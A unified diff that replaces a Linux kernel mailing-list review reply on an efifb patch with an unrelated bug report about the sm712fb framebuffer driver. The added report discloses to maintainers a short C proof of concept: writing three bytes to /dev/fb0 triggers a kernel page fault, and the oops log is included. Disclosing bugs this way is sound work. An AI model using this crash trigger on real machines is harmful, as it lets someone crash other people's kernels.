@@ -2,110 +2,100 @@ Return-Path: <linux-fbdev-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 44198C433FE
-	for <linux-fbdev@archiver.kernel.org>; Fri, 25 Feb 2022 22:11:31 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id CFB90C433EF
+	for <linux-fbdev@archiver.kernel.org>; Sat, 26 Feb 2022 12:40:06 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S235770AbiBYWMC (ORCPT <rfc822;linux-fbdev@archiver.kernel.org>);
-        Fri, 25 Feb 2022 17:12:02 -0500
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:44492 "EHLO
+        id S231411AbiBZMkh (ORCPT <rfc822;linux-fbdev@archiver.kernel.org>);
+        Sat, 26 Feb 2022 07:40:37 -0500
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:48464 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S235406AbiBYWMB (ORCPT
+        with ESMTP id S230085AbiBZMkh (ORCPT
         <rfc822;linux-fbdev@vger.kernel.org>);
-        Fri, 25 Feb 2022 17:12:01 -0500
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.129.124])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTP id 7351E52E17
-        for <linux-fbdev@vger.kernel.org>; Fri, 25 Feb 2022 14:11:29 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-        s=mimecast20190719; t=1645827088;
-        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-         to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-         content-transfer-encoding:content-transfer-encoding:
-         in-reply-to:in-reply-to:references:references;
-        bh=j3VxtWAMog8m5ArNU/BgenbWuy7FcGC+lz0O8q97Sw8=;
-        b=Rewd7viwx0OkgPiaqXpobyInoqsiuuerWpBNC106v713Afn/XHSb2peqa4G1s3kaTv7N6p
-        uSakCapbVyrMYHknpbg1mpS28HKX2h8xwOz7vET0YP5VWbMG6veipUI+zK7QcfhtqEYJ1l
-        8fB44oX7A2E9yFzHgkxII8ap0CAhzNI=
-Received: from mail-wr1-f72.google.com (mail-wr1-f72.google.com
- [209.85.221.72]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- us-mta-403-dZSR364iOa6eJp7RVph1zA-1; Fri, 25 Feb 2022 17:11:27 -0500
-X-MC-Unique: dZSR364iOa6eJp7RVph1zA-1
-Received: by mail-wr1-f72.google.com with SMTP id p9-20020adf9589000000b001e333885ac1so1172833wrp.10
-        for <linux-fbdev@vger.kernel.org>; Fri, 25 Feb 2022 14:11:27 -0800 (PST)
+        Sat, 26 Feb 2022 07:40:37 -0500
+Received: from mail-pj1-x102c.google.com (mail-pj1-x102c.google.com [IPv6:2607:f8b0:4864:20::102c])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D459D1DEABD;
+        Sat, 26 Feb 2022 04:40:02 -0800 (PST)
+Received: by mail-pj1-x102c.google.com with SMTP id iq13-20020a17090afb4d00b001bc4437df2cso7253249pjb.2;
+        Sat, 26 Feb 2022 04:40:02 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=YuRKzy5bovku/y4EtdmzO3tswEC9NnMGJRdh5w4j4uo=;
+        b=BuZMddIc1HxfpW2RI1vxH2+Yg4P/UAwzSk07gyuLA/DFysQx9PnVhSPd6bjwqFXlax
+         0ksjho++2JtylK+2yZFTBSj3mP9FqF2+5A5wj35pXdoC7HWMTFlbabJjriao5kBf3gXa
+         +MZtYgp5WgAuLsmq5Y8k2CDHliYjkmQ1Pd4xDJPbrDV7syTqb+vbH1aNceNrCmr0eL0X
+         BXuiCPGM+AhNk8+rdH2FUIoALOiViGZmtPTBCqnxN4r6ESb1r65qfF7KSRTJ5imiKPF2
+         WRspPwXCNk1hppKWU1G6b4YZ2OYQfrD7Y23qpXjDxWy2mWdFX3e1Y+poJLM9LgvL1Cx3
+         9l6g==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20210112;
-        h=x-gm-message-state:message-id:date:mime-version:user-agent:subject
-         :content-language:to:cc:references:from:in-reply-to
-         :content-transfer-encoding;
-        bh=j3VxtWAMog8m5ArNU/BgenbWuy7FcGC+lz0O8q97Sw8=;
-        b=C6LM1F3SmeHVWE1EIC1/tOm6gnbxZ8uZr7jQMzHr1X+WbQdh9S7lvr/mdHX0dcgc6x
-         WaNkEDnH8NlEpEjtaH6aNIXmbXNYGy7DieL1ALrFbMbHn8I5E1/4KpbutibzWf/9FZtK
-         PbGc3A7bbka/lVhXLEegbY/Bisa+KQLgB/uorbORntiCYujbRi68pQ6VDEth1afTlX2A
-         M4iWR5gOa9kQfeGOht+ux6TUBFpS4Pt7H0KkUjitV7vlqX8rtfunAVgjNpWB97yksgDj
-         fHIPrnBOg8Ksf2H4C9J82JR5B9iqZYu8BR+/syPeFF4q+SqXtFZ9p4rijaT/psjduNFn
-         SNjg==
-X-Gm-Message-State: AOAM533XSxB2Z/HLd9AiGBHE7AAicwToYMtcVLuswfAfjEmbf4HdgYp6
-        Jj5xoB6zbaeT6KSp/KYcRWbuv8kl6+hux6d9vSDDh0NUqKhCgTDxITF8eVjYOmGWsRXe8GnFsoy
-        Mq5wdlAFhc6EY1Kq8alIXSKo=
-X-Received: by 2002:adf:e3d0:0:b0:1ea:9be0:3162 with SMTP id k16-20020adfe3d0000000b001ea9be03162mr7706146wrm.205.1645827086222;
-        Fri, 25 Feb 2022 14:11:26 -0800 (PST)
-X-Google-Smtp-Source: ABdhPJxpYbnDqQh/prWaTqz6c8tOt2xrJUKB8Clt1MsSwRkjB7ijhcF6OjzqFxBwoqAxNJNzJXwD4g==
-X-Received: by 2002:adf:e3d0:0:b0:1ea:9be0:3162 with SMTP id k16-20020adfe3d0000000b001ea9be03162mr7706135wrm.205.1645827086036;
-        Fri, 25 Feb 2022 14:11:26 -0800 (PST)
-Received: from [192.168.1.102] ([92.176.231.205])
-        by smtp.gmail.com with ESMTPSA id l26-20020a05600c1d1a00b00380def7d3desm3652202wms.17.2022.02.25.14.11.24
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Fri, 25 Feb 2022 14:11:25 -0800 (PST)
-Message-ID: <272b6278-b153-1e12-a542-0f9706c592a6@redhat.com>
-Date:   Fri, 25 Feb 2022 23:11:24 +0100
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=YuRKzy5bovku/y4EtdmzO3tswEC9NnMGJRdh5w4j4uo=;
+        b=LVsRLrbiu1rJvJ0/f37bSnBRXoPeY+AjVrS3trM0+MTxOyj3XquBPPYmXcbI+/heM+
+         iUBeSZDc7O+fUtXZJXVpTotKN/JHH4b8UTAu6UuSaDyR7+JwVQfBc2qyQnCpxivkqOwb
+         KpqyeUUrFDmo5EMDC8EL4bs2hi5bCVY4ZnrOsBLa1JnL4TLZY2pHoPSYt5mdqwkv5KMu
+         6v1PDQ75EQ6jtu/iMtbw2p1Z7kIVrOj7IUsCtOEUZGrneuTs/UIi5y7lyZsnG4Gn+5dD
+         62JA5Gb8tQ+wJlGgZmEU5C97YU+RebARvLKLe56dOgKOM2hJnHaHjLaUrPmkr0G+v1o3
+         C/Rw==
+X-Gm-Message-State: AOAM530VqoI6T+xsLv+AGVS23Iwl1Z/tfFaKa/SL8+HYXqYtM/Mhh4sI
+        KhnQPlrVY01t1jt99sTr5IxBnHcVNzxVa/wTEQ==
+X-Google-Smtp-Source: ABdhPJwbCKBPx6DuSPeqH6k4X0BcBh3xfFXOJBO1dc+vcW3pMhCvj6J/jvfUwNucJlrmv9B0PcpnxtoSFK03D6ttNJE=
+X-Received: by 2002:a17:90a:3d0f:b0:1bb:80e9:3b45 with SMTP id
+ h15-20020a17090a3d0f00b001bb80e93b45mr7663101pjc.31.1645879202221; Sat, 26
+ Feb 2022 04:40:02 -0800 (PST)
 MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
- Thunderbird/91.5.0
-Subject: Re: [PATCH v4 3/3] efifb: Remove redundant efifb_setup_from_dmi stub
-Content-Language: en-US
-To:     Michal Suchanek <msuchanek@suse.de>,
-        dri-devel@lists.freedesktop.org, linux-fbdev@vger.kernel.org,
-        Thomas Zimmermann <tzimmermann@suse.de>
-Cc:     Borislav Petkov <bp@alien8.de>,
-        Thomas Gleixner <tglx@linutronix.de>,
-        Ingo Molnar <mingo@redhat.com>,
-        Dave Hansen <dave.hansen@linux.intel.com>, x86@kernel.org,
-        "H. Peter Anvin" <hpa@zytor.com>, Martin Mares <mj@ucw.cz>,
-        Helge Deller <deller@gmx.de>, Ard Biesheuvel <ardb@kernel.org>,
-        Bjorn Andersson <bjorn.andersson@linaro.org>,
-        Sudeep Holla <sudeep.holla@arm.com>,
-        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        Krzysztof Kozlowski <krzysztof.kozlowski@canonical.com>,
-        Arnd Bergmann <arnd@arndb.de>,
-        Geert Uytterhoeven <geert+renesas@glider.be>,
-        Cristian Marussi <cristian.marussi@arm.com>,
-        Andy Shevchenko <andriy.shevchenko@linux.intel.com>,
-        David Herrmann <dh.herrmann@gmail.com>,
-        linux-kernel@vger.kernel.org, linux-video@atrey.karlin.mff.cuni.cz,
-        linux-efi@vger.kernel.org
-References: <1f13e6f2-a87c-83ac-7119-8632c8c8ac8e@redhat.com>
- <7416c439d68e9e96068ea5c77e05c99c7df41750.1645822213.git.msuchanek@suse.de>
-From:   Javier Martinez Canillas <javierm@redhat.com>
-In-Reply-To: <7416c439d68e9e96068ea5c77e05c99c7df41750.1645822213.git.msuchanek@suse.de>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+From:   Zheyu Ma <zheyuma97@gmail.com>
+Date:   Sat, 26 Feb 2022 20:39:51 +0800
+Message-ID: <CAMhUBjnAQmqPQEjiTNBnki5Vidnsr0ZFmBSM8pis4+j0=oZpPg@mail.gmail.com>
+Subject: [BUG] fbdev: sm712fb: Page fault in smtcfb_write()
+To:     sudipm.mukherjee@gmail.com, teddy.wang@siliconmotion.com
+Cc:     linux-fbdev@vger.kernel.org, dri-devel@lists.freedesktop.org,
+        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
+Content-Type: text/plain; charset="UTF-8"
 Precedence: bulk
 List-ID: <linux-fbdev.vger.kernel.org>
 X-Mailing-List: linux-fbdev@vger.kernel.org
 
-On 2/25/22 21:51, Michal Suchanek wrote:
-> efifb is the only user of efifb_setup_from_dmi which is provided by
-> sysfb which is selected by efifb. That makes the stub redundant.
-> 
-> Signed-off-by: Michal Suchanek <msuchanek@suse.de>
-> ---
+Hi,
 
-Reviewed-by: Javier Martinez Canillas <javierm@redhat.com>
+I found a minor in the smtcfb_write() function of the driver sm712fb.
+This write function can not handle the case that the size of the
+buffer is 3 and does not check for it, which may cause a page fault.
 
--- 
-Best regards,
+Here is a simple PoC:
 
-Javier Martinez Canillas
-Linux Engineering
-Red Hat
+#include <endian.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
 
+int main(void)
+{
+    int fd = open("/dev/fb0", O_RDWR);
+    write(fd, "000", 3);
+
+    return 0;
+}
+
+The following log reveals it:
+
+[ 1830.917859] BUG: unable to handle page fault for address: ffffc90001ffffff
+[ 1830.918481] #PF: supervisor write access in kernel mode
+[ 1830.919005] #PF: error_code(0x0002) - not-present page
+[ 1830.921941] RIP: 0010:smtcfb_write+0x2c0/0x460
+[ 1830.930156] Call Trace:
+[ 1830.930364]  <TASK>
+[ 1830.930543]  vfs_write+0x291/0xd60
+[ 1830.930835]  ? do_sys_openat2+0x27d/0x350
+[ 1830.931192]  ? __fget_light+0x54/0x340
+[ 1830.931504]  ksys_write+0xce/0x190
+[ 1830.931784]  do_syscall_64+0x43/0x90
+
+Regards,
+Zheyu Ma
